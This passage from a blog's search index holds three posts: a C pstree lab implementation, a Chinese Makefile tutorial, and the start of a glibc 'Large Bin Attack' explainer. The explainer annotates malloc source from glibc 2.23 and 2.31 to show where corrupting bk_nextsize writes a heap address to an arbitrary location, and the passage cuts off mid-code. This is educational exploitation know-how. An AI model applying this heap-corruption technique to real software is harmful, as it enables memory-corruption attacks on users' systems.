class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br><span class="line"></span><br><span class="line">Pipinfo allpid[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> pidcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pid, Processtree* root, <span class="type">int</span> paddinglen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    setProcessInfo();</span><br><span class="line">    Processtree* root = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">    root-&gt;pid = allpid[<span class="number">0</span>].pid;</span><br><span class="line">    <span class="built_in">strcpy</span>(root-&gt;pidname, allpid[<span class="number">0</span>].pidname);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> <span class="title">longopt</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;show-pids&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;numeric-sort&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;version&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;V&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">switch</span> (opt = getopt_long(argc, argv, <span class="string">&quot;Vpnh&quot;</span>, longopt, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Grxer 2023 3 25\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">true</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (optind == argc) &#123;</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pstree -h for help&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* proc = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Can &#x27;t open /proc/&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">NULL</span> != (entry = readdir(proc))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == (pid = atoi(entry-&gt;d_name)))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, pid);</span></span><br><span class="line">            allpid[pidcount].pid = pid;</span><br><span class="line">            allpid[pidcount].ppid = getPpid(entry-&gt;d_name, allpid[pidcount].pidname);</span><br><span class="line">            <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, allpid[pidcount].pid, allpid[pidcount].pidname, allpid[pidcount].ppid);</span></span><br><span class="line">            pidcount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    closedir(proc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拿到父进程</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line">    <span class="type">char</span> processpath[<span class="number">30</span>] = <span class="string">&quot;/proc/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, pid);</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, <span class="string">&quot;/stat&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, processpath);</span></span><br><span class="line">    FILE* fp = fopen(processpath, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="type">char</span> i;</span><br><span class="line">        <span class="type">pid_t</span> _pid, ppid;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d (%s %c %d&quot;</span>, &amp;_pid, name, &amp;i, &amp;ppid);</span><br><span class="line">        name[<span class="built_in">strlen</span>(name) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, _pid, name, ppid);</span></span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> ppid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %s %s&quot;</span>, <span class="string">&quot;open&quot;</span>, processpath, <span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pidflag, Processtree* root, <span class="type">int</span> paddinglen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> childrens[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    findAllchild(root-&gt;pid, childrens);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">60</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (childrens[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="comment">//没有子进程直接打印返回</span></span><br><span class="line">        <span class="keyword">if</span> (pidflag)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s(%d)&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, root-&gt;pidname);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pidflag)</span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s(%d)-+-&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s-+-&quot;</span>, root-&gt;pidname);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">666</span> &amp;&amp; <span class="number">0</span> != childrens[i]; i++) &#123;</span><br><span class="line">        Processtree* temp = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;pid = allpid[childrens[i]].pid;</span><br><span class="line">        <span class="built_in">strcpy</span>(temp-&gt;pidname, allpid[childrens[i]].pidname);</span><br><span class="line">        creatTree(pidflag, temp, <span class="built_in">strlen</span>(str) + paddinglen);<span class="comment">//递归打印</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; <span class="number">500</span> &amp;&amp; childrens[i + <span class="number">1</span>] != <span class="number">0</span>)<span class="comment">//下一个子进程还不为空，对齐，打印树枝</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str) + paddinglen; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;|-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到全部子线程 csapp 5.8 循环展开优化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;i &lt; pidcount - <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i + <span class="number">1</span>].ppid == pid)</span><br><span class="line">            childrenar[index++] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; pidcount; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How 2 GNU Makefile</title>
      <link href="/2023/03/25/How2Makefile/"/>
      <url>/2023/03/25/How2Makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="Makefile-advantage"><a href="#Makefile-advantage" class="headerlink" title="Makefile advantage"></a>Makefile advantage</h2><ol><li>管理代码的编译，决定该编译什么文件，编译顺序，以及是否需要重新编译；</li><li>节省编译时间。如果文件有更改，只需重新编译此文件即可，无需重新编译整个工程；</li><li>一劳永逸。Makefile通常只需编写一次，后期就不用过多更改。</li></ol><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><p><strong>Makefile</strong>或<strong>makefile</strong></p><p>其他名字需要 make -f filename</p><h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">&lt;target&gt; : &lt;prerequisites&gt; </span><br><span class="line">[tab]  &lt;commands&gt;</span><br></pre></td></tr></table></figure><ul><li><p>只有当target不存在，或这prerequisites里的文件比target新是才会执行commands</p></li><li><p>多个目标文件用空格隔开，可以用\来换行</p></li><li><p>注释 #单行</p></li><li><p>make 没有指定文件时，默认会执行Makefile文件的第一个目标</p></li><li><p>.PHONY 多个可以用空格分开</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> *.o temp</span><br><span class="line"><span class="comment"># make clean</span></span><br></pre></td></tr></table></figure><p>声明clean是”伪目标”之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令，解决当前文件夹下有个clean的冲突</p></blockquote></li><li><p>伪目标，即没有commands</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span>: file1 file2 file3</span><br></pre></td></tr></table></figure><p>make source相当于</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make file1</span><br><span class="line">$ make file2</span><br><span class="line">$ make file3</span><br></pre></td></tr></table></figure></blockquote></li><li><p>@可以关闭commands的回显</p></li><li><p>%模式匹配，匹配文件夹下每一个符合文件</p><blockquote><p>模式规则是在目标及依赖条件中使用%来匹配对应的文件，比如在目录下有main.c, func1.c, func2.c三个文件，对这三个文件的编译可以由一条规则完成：</p><p><code>%.o:%.c  $(CC) –c $&lt; -o $@</code></p></blockquote></li><li><p><strong>-</strong> ：表示此命令即使执行出错，也依然继续执行后续命令</p></li><li><p>include<filename> 引用其它的Makefile</filename></p></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>类似于c语言的macro</p><p>用&#x3D;号赋值</p><p>用$()取值</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VARIABLE = value</span><br><span class="line"><span class="comment"># 在执行时扩展，允许递归扩展。</span></span><br><span class="line"></span><br><span class="line">VARIABLE := value</span><br><span class="line"><span class="comment"># 在定义时扩展。恒等于</span></span><br><span class="line"></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"><span class="comment"># 只有在该变量为空时才设置值。</span></span><br><span class="line"></span><br><span class="line">VARIABLE += value</span><br><span class="line"><span class="comment"># 将值追加到变量的尾端。</span></span><br></pre></td></tr></table></figure><h2 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>@    规则中的目标</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>&lt;     规则中的第一个依赖条件</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">^</span>    规则中的所有依赖条件</span><br><span class="line">app: main.c func1.c fun2.c</span><br><span class="line">    gcc <span class="built_in">$</span><span class="built_in">^</span> - o <span class="built_in">$</span>@</span><br><span class="line">其中：<span class="built_in">$</span><span class="built_in">^</span>表示main.c func1.c fun2.c，<span class="built_in">$</span>&lt;表示main.c，<span class="built_in">$</span>@表示app。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>* 　　不包含扩展名的目标文件名称。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>+ 　　所有的依赖文件，以空格分开，并以出现的先后为序，可能包含重复的依赖文件。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>? 　　所有的依赖文件，以空格分开，这些依赖文件的修改日期比目标的创建日期晚。</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>@ 　 目标的完整名称。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>wildcard:</strong></p><p>用于查找指定目录下指定类型的文件，参数就是目录+文件类型，比如：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">src = $（wildcard ./src/*.c)</span><br></pre></td></tr></table></figure><p>这句话表示：找到.&#x2F;src 目录下所有后缀为.c的文件，并赋给变量src。</p><p><strong>patsubst:</strong></p><p>匹配替换，例如以下例子，用于从src目录中找到所有.c 结尾的文件，并将其替换为.o文件，并赋值给obj。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">obj = $(patsubst %.c ,%.o ,$(src))</span><br></pre></td></tr></table></figure><p>把src变量中所有后缀为.c的文件替换成.o。</p><p>特别地，如果要把所有.o文件放在obj目录下，可用以下方法：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ob = $(patsubst ./src/%.c, ./obj/%.o, $(src))</span><br></pre></td></tr></table></figure><p><strong>subst</strong></p><p>subst 函数用来文本替换，格式如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(subst from,to,text)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$(subst ee,EE,feet on the street)</span><br><span class="line">将字符串&quot;feet on the street&quot;替换成&quot;fEEt on the strEEt&quot;。</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">├──main.c</span><br><span class="line">├──factorial.c</span><br><span class="line">├──printhello.c</span><br><span class="line">└──functions.h</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">TARGET = hello</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> ./%.c,./%.o,<span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">GCCFLAGS= -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">    <span class="variable">$(CC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line">clean :</span><br><span class="line">    rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2023/03/24/Large-bin-attack/"/>
      <url>/2023/03/24/Large-bin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p><img src="/2023/03/24/Large-bin-attack/image-20230812163127239.png" alt="image-20230812163127239"></p><p>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中，32位程序大于504(0x1f8)进入largebin，64位程序大于1008(0x3f0)进入largebin，否则合适的话进入smallbin</p><p>largebin比unsortedbin多了<code> struct malloc_chunk* fd_nextsize;</code>指向比当前小的chunk<code> struct malloc_chunk* bk_nextsize;</code>指向比当前大的chunk</p><h2 id="Large-Bin的插入顺序"><a href="#Large-Bin的插入顺序" class="headerlink" title="Large Bin的插入顺序"></a>Large Bin的插入顺序</h2><ol><li>按照大小，从大到小排序,largebin链接最小的chunk</li><li>如果大小相同，按照free的时间排序</li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><h2 id="2-23malloc-c源码-remove-from-unsorted-list"><a href="#2-23malloc-c源码-remove-from-unsorted-list" class="headerlink" title="2.23malloc.c源码 remove from unsorted list"></a>2.23malloc.c源码 remove from unsorted list</h2><p>victim是我们要从unsortedbin分类的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//判断size是不是属于smallbin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;<span class="comment">//bck的fd存放最大chunk，bk存放最小chunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//这里开始就是放入largebin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//如果相等证明他是这个组里面第一个，不相等说明largebin里有其他的chunk了需要进行比较，维持大小顺序</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)<span class="comment">//找一个比当前victim-&gt;size要&gt;=的地方链接链接进去</span></span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)<span class="comment">//如果等于</span></span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">// victim-&gt;size &gt; fwd-&gt;size</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//fwd != bck)相等证明他是这个大小的组里面第一个直接把fd_nextsize和bk_nextsize指向自己</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p><a href="https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p><p>加入了check，只能放比原来的小的chunk了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">        &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;<span class="comment">//现在的堆块victim比已经存在的chunk(fwd-&gt;fd)小，进入这个分支，适合所有版本</span></span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//fwd-&gt;fd-&gt;bk_nextsize被我们改成任意可写地址值</span></span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        <span class="comment">//漏洞触发点，实现任意地址的fd_nextsize写入堆地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">            == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; &#123;<span class="comment">//现在的chunk比已经存在的chunk大，进入这个分支</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//这里可以看到加入了新的check</span></span><br><span class="line">                <span class="comment">//如果我们改了fwd-&gt;bk_nextsize的值,那么fwd-&gt;bk_nextsize-&gt;fd_nextsize就不是它本身fwd了</span></span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">         bck = fwd-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">             malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = 